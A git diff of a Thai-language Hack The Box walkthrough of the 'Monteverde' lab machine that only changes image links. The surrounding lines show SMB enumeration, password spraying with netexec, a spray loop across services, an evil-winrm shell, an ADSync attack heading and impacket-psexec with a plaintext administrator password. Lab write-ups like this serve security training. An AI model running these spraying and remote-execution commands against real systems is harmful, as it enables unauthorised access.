@@ -54,7 +54,7 @@ smbclient -N -L //10.10.10.172
 smbmap -H 10.10.10.172 -u ice
 ```
 
-![[Challenge/HTB Challenge/Monteverde/IMG/001.png]]
+![](./IMG/001.png)
 
 จากภาพด้านบนทำให้ทราบว่า smb ไม่สามารถเข้าได้ และต้องอาศัยใช้ Credential 
 
@@ -121,7 +121,7 @@ svc-netapp
 netexec smb 10.10.10.172   -u users.txt -p users.txt 
 ```
 
-![[Challenge/HTB Challenge/Monteverde/IMG/002.png]]
+![](./IMG/002.png)
 
 
 
@@ -132,7 +132,7 @@ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
 smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
 ```
 
-![[Challenge/HTB Challenge/Monteverde/IMG/003.png]]
+![](./IMG/003.png)
 
 ดึงไฟล์ดังกล่าวด้วยคำสั่ง smbclinet 
 ```bash
@@ -166,7 +166,7 @@ smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c 'get mhope/azure.x
 ```bash
 for service in wmi winrm smb mssql rdp ssh ldap ftp vnc; do netexec $service 10.10.10.172  -u ./users.txt -p '4n0therD4y@n0th3r$' ; done
 ```
-![[Challenge/HTB Challenge/Monteverde/IMG/004.png]]
+![](./IMG/004.png)
 
 ## Shell as mhope 
 
@@ -176,10 +176,10 @@ evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
 
 
 # Host Enum 
-![[Challenge/HTB Challenge/Monteverde/IMG/005.png]]
+![](./IMG/005.png)
 
 รัน WinPeas จะพบว่ามีการใช้งาน Azure ซึ่งหากเราสำรวจ mhope จะเห็น .Azure ซึ่งจะเห็นข้อมูลที่น่าสนใจดังต่อไปนี้ 
-![[Challenge/HTB Challenge/Monteverde/IMG/006.png]]
+![](./IMG/006.png)
 
 
 ### **อธิบายการโจมตี ADSync**
@@ -229,7 +229,7 @@ Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type,
 impacket-psexec 'administrator':'d0m@in4dminyeah!'@10.10.10.172
 ```
 
-![[Challenge/HTB Challenge/Monteverde/IMG/007.png]]
+![](./IMG/007.png)
 # PWNED 
 
 
